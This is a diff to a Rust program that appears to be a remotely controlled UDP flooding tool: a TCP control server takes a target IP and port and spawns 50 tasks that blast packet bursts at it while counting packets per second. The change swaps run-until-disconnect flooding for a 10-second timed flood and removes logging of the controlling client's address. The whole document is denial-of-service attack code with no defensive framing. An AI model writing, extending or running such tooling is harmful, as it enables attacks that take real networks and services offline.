@@ -1,14 +1,13 @@
 use tokio::net::{TcpListener, TcpStream, UdpSocket};
 use tokio::io::{AsyncBufReadExt, BufReader, AsyncWriteExt};
-use tokio::time::{sleep, Duration};
+use tokio::time::{sleep, Duration}; // <-- More explicit path
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::sync::Arc;
 use anyhow::Result;
 
 const THREADS: usize = 50;
 const BURST_SIZE: usize = 5;
-// DURATION_SECONDS is no longer used by the main flood logic
-// const DURATION_SECONDS: u64 = 10; 
+const DURATION_SECONDS: u64 = 10;
 const CONTROL_PORT: u16 = 9000;
 
 fn build_payload() -> Vec<u8> {
@@ -65,30 +64,35 @@ async fn handle_client(mut stream: TcpStream) -> Result<()> {
             if let Ok(port) = port_str.parse::<u16>() {
                 let target = format!("{}:{}", ip, port);
                 println!("Received target: {}", target);
-                writer.write_all(format!("Flooding target: {}. Close connection to stop.\n", target).as_bytes()).await?;
+                writer.write_all(format!("Flooding target: {}\n", target).as_bytes()).await?;
 
                 let packet_count = Arc::new(AtomicU64::new(0));
                 let running = Arc::new(AtomicU64::new(1));
 
-                // The monitor and flood tasks will run as long as this handle_client function is active.
-                // When the client disconnects, the function will exit, and the 'running' Arc will be dropped.
-                // This causes the tasks to see running == 0 (or they will be dropped), stopping the flood.
-                
-                let _monitor_handle = {
+                let monitor_handle = {
                     let pc = Arc::clone(&packet_count);
                     let run = Arc::clone(&running);
                     tokio::spawn(pps_monitor(pc, run))
                 };
 
+                let mut flood_tasks = vec![];
                 for _ in 0..THREADS {
                     let pc = Arc::clone(&packet_count);
                     let run = Arc::clone(&running);
                     let tgt = target.clone();
-                    tokio::spawn(handle_flood(tgt, pc, run));
+                    flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
                 }
 
-                // NOTE: The sleep timer and the explicit stop logic have been removed.
-                // The flood now runs until the control connection is closed.
+                sleep(Duration::from_secs(DURATION_SECONDS)).await;
+                running.store(0, Ordering::Relaxed);
+
+                for task in flood_tasks {
+                    task.await??;
+                }
+                let _ = monitor_handle.await;
+
+                println!("Stopped for target: {}", target);
+                writer.write_all(format!("Stopped flood for target: {}\n", target).as_bytes()).await?;
 
             } else {
                  writer.write_all(b"Invalid port number.\n").await?;
@@ -97,9 +101,6 @@ async fn handle_client(mut stream: TcpStream) -> Result<()> {
             writer.write_all(b"Invalid format. Use IP:PORT.\n").await?;
         }
     }
-
-    println!("Client disconnected, stopping flood.");
-    // When this function returns, the 'running' Arc is dropped. The tasks will then stop.
     Ok(())
 }
 
@@ -109,11 +110,10 @@ async fn main() -> Result<()> {
     println!("TCP control server listening on port {}", CONTROL_PORT);
 
     loop {
-        let (stream, addr) = listener.accept().await?;
-        println!("Accepted connection from: {}", addr);
+        let (stream, _) = listener.accept().await?;
         tokio::spawn(async move {
             if let Err(e) = handle_client(stream).await {
-                eprintln!("Error handling client {}: {}", addr, e);
+                eprintln!("Error handling client: {}", e);
             }
         });
     }
